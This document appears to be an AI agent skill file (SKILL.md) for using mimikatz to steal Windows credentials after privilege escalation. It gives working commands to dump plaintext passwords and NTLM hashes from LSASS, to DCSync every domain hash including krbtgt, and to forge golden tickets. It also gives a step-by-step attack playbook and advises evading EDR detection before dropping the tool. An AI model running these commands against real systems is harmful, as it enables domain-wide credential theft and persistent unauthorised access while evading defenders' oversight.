---
name: mimikatz-credentials
description: "mimikatz: Post-local privilege escalation session credential harvesting and DCSync domain-wide hashes. Signals: memory dump, lsass, enable debug privilege, memory plaintext/NTLM capture."
zh-signals: "mimikatz: 单机提权后收割会话凭证、DCSync 全域哈希。信号:内存转储,lsass,提升调试权限,内存抓明文/NTLM。"
when-to-use: >-
  Use after local admin or SYSTEM access on Windows to harvest plaintext
  passwords, hashes, and tickets from LSASS, or to DCSync domain hashes with
  directory replication rights.
---

# mimikatz

- Attack Category: C24 Memory Dumping and LSASS Theft
- Upstream Repository: https://github.com/gentilkiwi/mimikatz
- Upstream License: CC BY 4.0 (attribution) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
Download mimikatz.exe from the release page, or chocolatey install mimikatz
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `privilege::debug` | Enable debug privilege |
| `sekurlsa::logonpasswords` | Extract plaintext/NTLM from memory |
| `lsadump::sam` | Local SAM database |
| `lsadump::dcsync /user:corp\krbtgt` | DCSync pull of krbtgt |
| `sekurlsa::tickets /export` | Export tickets |
| `kerberos::ptt ticket.kirbi` | See the upstream documentation |
| `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-x /krbtgt:<hash>` | See the upstream documentation |

## Attack Scenario Playbook

### Harvest session credentials after local privilege escalation

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Copy the NTLM hashes for pth or cracking
```

### DCSync domain-wide hashes

```bash
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

## Notes

A must-have on Windows; in environments with LSA Protection/Credential Guard, switch to sekurlsa::dpapi or dump the DPAPI masterkey instead. Any EDR environment will flag it, so drop and evade first.
